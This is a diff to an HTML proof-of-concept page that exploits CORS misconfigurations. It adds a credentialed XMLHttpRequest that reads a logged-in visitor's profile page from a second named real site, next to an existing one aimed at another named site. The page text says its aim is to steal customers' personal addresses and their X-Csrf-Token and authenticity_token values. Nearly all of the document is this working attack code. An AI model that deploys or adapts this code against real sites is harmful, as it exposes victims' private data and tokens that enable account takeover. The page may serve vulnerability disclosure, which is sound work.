@@ -11,11 +11,15 @@ CORS misconfigure that lead custom's profile be stealed and do any malicous oper
 </br>
 </br>
 <div text="steal customer's personal informaiton ">
-steal customer's personal address and their X-Csrf-Token and authenticity_token value
-<textarea id="customer" style="width: 200px; height: 150px;"></textarea>
+steal customer's personal address and their X-Csrf-Token and authenticity_token value from https://zhixuelong.com
+<textarea id="customerzhixuelong" style="width: 200px; height: 150px;"></textarea>
 </div>
 </br>
 </br>
+<div text="steal customer's personal informaiton ">
+steal customer's personal address and their X-Csrf-Token and authenticity_token value from https://vchy.com.ua
+<textarea id="customervchy" style="width: 200px; height: 150px;"></textarea>
+</div>
 </br>
 <script>
 
@@ -24,7 +28,7 @@ steal customer's personal address and their X-Csrf-Token and authenticity_token 
 	{
 		if (xmlhttp1.readyState==4 && xmlhttp1.status==200)
 		{
-			document.getElementById("customer").innerHTML = xmlhttp1.responseText;
+			document.getElementById("customerzhixuelong").innerHTML = xmlhttp1.responseText;
 			console.log("Success");
 		}
 	}
@@ -32,6 +36,19 @@ steal customer's personal address and their X-Csrf-Token and authenticity_token 
 	xmlhttp1.open("GET","https://zhixuelong.com/teachers/profile",true);
 	xmlhttp1.withCredentials = true;
 	xmlhttp1.send();
+	
+     var xmlhttp2 = new XMLHttpRequest()
+     xmlhttp2.onreadystatechange=function()
+	{
+		if (xmlhttp2.readyState==4 && xmlhttp1.status==200)
+		{
+			document.getElementById("customervchy").innerHTML = xmlhttp2.responseText;
+			console.log("Success");
+		}
+	}
+	xmlhttp2.open("GET","https://vchy.com.ua/home",true);
+	xmlhttp2.withCredentials = true;
+	xmlhttp2.send();
 	
 	
 </script>
